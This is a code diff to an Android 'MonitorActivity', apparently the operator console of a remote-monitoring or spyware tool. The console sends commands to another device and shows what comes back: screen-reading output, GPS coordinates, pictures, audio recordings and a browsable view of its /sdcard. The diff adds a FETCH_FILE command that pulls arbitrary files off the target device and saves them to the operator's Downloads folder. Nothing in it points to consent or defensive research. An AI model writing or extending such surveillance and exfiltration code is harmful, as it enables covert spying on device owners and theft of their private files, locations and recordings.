@@ -25,6 +25,9 @@ import android.widget.ImageView
 import android.widget.LinearLayout
 import android.widget.TextView
 import android.widget.Toast
+import android.app.Dialog
+import android.graphics.drawable.ColorDrawable
+import android.view.Window
 
 import android.webkit.WebView
 import android.webkit.WebViewClient
@@ -65,6 +68,7 @@ class MonitorActivity : AppCompatActivity() {
     private var lastAudioBase64: String? = null
     private var lastImageBase64: String? = null
     private var lastScreenReadText: String? = null
+    private var lastProcessedResultKey: String? = null
 
     // File Browser
     private var currentDirectoryPath = "/sdcard"
@@ -490,6 +494,8 @@ class MonitorActivity : AppCompatActivity() {
         database.child("results").addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
                 val children = snapshot.children.toList()
+                val latestKey = children.lastOrNull()?.key
+                val shouldRedirect = lastProcessedResultKey != null && latestKey != lastProcessedResultKey
 
                 // Clear map overlays before adding new ones from history
                 mapView.overlays.clear()
@@ -504,9 +510,15 @@ class MonitorActivity : AppCompatActivity() {
                     val type = child.child("type").value as? String
                     val data = child.child("data").value as? String
 
+                    val isNewAndLatest = shouldRedirect && child.key == latestKey
+
                     if (type != null && data != null) {
-                        appendResultToHistory(type, data, geoPoints)
+                        appendResultToHistory(type, data, geoPoints, isNewAndLatest)
                     }
+                }
+
+                if (latestKey != null) {
+                    lastProcessedResultKey = latestKey
                 }
 
                 // Update map if locations exist
@@ -535,7 +547,7 @@ class MonitorActivity : AppCompatActivity() {
         })
     }
 
-    private fun appendResultToHistory(type: String, data: String, geoPoints: MutableList<GeoPoint>) {
+    private fun appendResultToHistory(type: String, data: String, geoPoints: MutableList<GeoPoint>, shouldRedirect: Boolean = false) {
         val container = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             setPadding(0, 16, 0, 16)
@@ -557,8 +569,15 @@ class MonitorActivity : AppCompatActivity() {
                     tvCurrentPath.text = currentDirectoryPath
 
                     val adapter = FileAdapter(this@MonitorActivity, files) { filePath ->
-                        sendCommand("FETCH_PIC:$filePath")
-                        Toast.makeText(this@MonitorActivity, "Requesting picture...", Toast.LENGTH_SHORT).show()
+                        // Check if it's a picture based on extension for FETCH_PIC command
+                        if (filePath.endsWith(".jpg", true) || filePath.endsWith(".jpeg", true) ||
+                            filePath.endsWith(".png", true) || filePath.endsWith(".webp", true)) {
+                            sendCommand("FETCH_PIC:$filePath")
+                            Toast.makeText(this@MonitorActivity, "Requesting picture...", Toast.LENGTH_SHORT).show()
+                        } else {
+                            sendCommand("FETCH_FILE:$filePath")
+                            Toast.makeText(this@MonitorActivity, "Requesting file...", Toast.LENGTH_SHORT).show()
+                        }
                     }
                     lvFiles.adapter = adapter
                     pbFilesLoading.visibility = View.GONE
@@ -580,16 +599,16 @@ class MonitorActivity : AppCompatActivity() {
                     buildScreenReadUI(data) // Parse and pass to ScreenReconstructionView
 
                     // Switch to Screen tab if not already there
-                    tabLayout.getTabAt(2)?.select()
+                    if (shouldRedirect) tabLayout.getTabAt(2)?.select()
                 } else if (data.contains("Coords:")) {
                     tv.text = data
                     container.addView(tv)
                     parseLocationData(data, geoPoints)
-                    tabLayout.getTabAt(3)?.select() // Jump to Map
+                    if (shouldRedirect) tabLayout.getTabAt(3)?.select() // Jump to Map
                 } else {
                     tv.text = "Text Result:\n$data"
                     container.addView(tv)
-                    tabLayout.getTabAt(4)?.select() // Jump to Logs
+                    if (shouldRedirect) tabLayout.getTabAt(4)?.select() // Jump to Logs
                 }
             }
             "IMAGE" -> {
@@ -603,9 +622,10 @@ class MonitorActivity : AppCompatActivity() {
 
                     // Display image in results tab or the new dedicated image view if you added one
                     val imageView = findViewById<ImageView>(R.id.ivFetchedImage)
-                    if (imageView != null) {
+                    val targetImageView = if (imageView != null) {
                         imageView.setImageBitmap(bitmap)
                         imageView.visibility = View.VISIBLE
+                        imageView
                     } else {
                         val newImageView = ImageView(this).apply {
                             setImageBitmap(bitmap)
@@ -618,12 +638,30 @@ class MonitorActivity : AppCompatActivity() {
                             }
                         }
                         container.addView(newImageView)
+                        newImageView
+                    }
+
+                    targetImageView.setOnClickListener {
+                        val dialog = Dialog(this@MonitorActivity)
+                        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE)
+                        val fullScreenImageView = ImageView(this@MonitorActivity).apply {
+                            setImageBitmap(bitmap)
+                            adjustViewBounds = true
+                            scaleType = ImageView.ScaleType.FIT_CENTER
+                            setOnClickListener { dialog.dismiss() }
+                        }
+                        dialog.setContentView(fullScreenImageView)
+                        dialog.window?.apply {
+                            setBackgroundDrawable(ColorDrawable(Color.BLACK))
+                            setLayout(WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.MATCH_PARENT)
+                        }
+                        dialog.show()
                     }
                 } catch (e: Exception) {
                     val errorTv = TextView(this).apply { text = "Failed to decode image." }
                     container.addView(errorTv)
                 }
-                tabLayout.getTabAt(4)?.select()
+                if (shouldRedirect) tabLayout.getTabAt(4)?.select()
             }
             "AUDIO" -> {
                 tv.text = "Audio received."
@@ -636,13 +674,26 @@ class MonitorActivity : AppCompatActivity() {
                     setOnClickListener { playAudioFromBase64(data) }
                 }
                 container.addView(btnPlay)
-                tabLayout.getTabAt(4)?.select() // Jump to Logs
+                if (shouldRedirect) tabLayout.getTabAt(4)?.select() // Jump to Logs
+            }
+            "FILE" -> {
+                val fileName = data.substringBefore("|")
+                val base64Data = data.substringAfter("|")
+                tv.text = "File received: $fileName"
+                container.addView(tv)
+
+                val btnSaveFile = Button(this).apply {
+                    text = "Save $fileName"
+                    setOnClickListener { saveFileToDownloads(fileName, base64Data) }
+                }
+                container.addView(btnSaveFile)
+                if (shouldRedirect) tabLayout.getTabAt(4)?.select()
             }
             "ERROR" -> {
                 tv.text = "Error: $data"
                 tv.setTextColor(Color.RED)
                 container.addView(tv)
-                tabLayout.getTabAt(4)?.select() // Jump to Logs
+                if (shouldRedirect) tabLayout.getTabAt(4)?.select() // Jump to Logs
             }
         }
 
@@ -796,6 +847,38 @@ class MonitorActivity : AppCompatActivity() {
             }
         } catch (e: Exception) {
             Toast.makeText(this, "Error saving image: ${e.message}", Toast.LENGTH_LONG).show()
+        }
+    }
+
+    private fun saveFileToDownloads(fileName: String, base64Data: String) {
+        try {
+            val fileBytes = Base64.decode(base64Data, Base64.DEFAULT)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                val resolver = applicationContext.contentResolver
+                val contentValues = ContentValues().apply {
+                    put(MediaStore.MediaColumns.DISPLAY_NAME, fileName)
+                    put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS)
+                }
+
+                val uri = resolver.insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, contentValues)
+                if (uri != null) {
+                    resolver.openOutputStream(uri)?.use { outputStream ->
+                        outputStream.write(fileBytes)
+                    }
+                    Toast.makeText(this, "Saved to Downloads: $fileName", Toast.LENGTH_LONG).show()
+                } else {
+                    Toast.makeText(this, "Failed to create MediaStore entry", Toast.LENGTH_SHORT).show()
+                }
+            } else {
+                val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
+                val file = File(downloadsDir, fileName)
+                FileOutputStream(file).use { fos ->
+                    fos.write(fileBytes)
+                }
+                Toast.makeText(this, "Saved to Downloads: $fileName", Toast.LENGTH_LONG).show()
+            }
+        } catch (e: Exception) {
+            Toast.makeText(this, "Error saving file: ${e.message}", Toast.LENGTH_LONG).show()
         }
     }
 
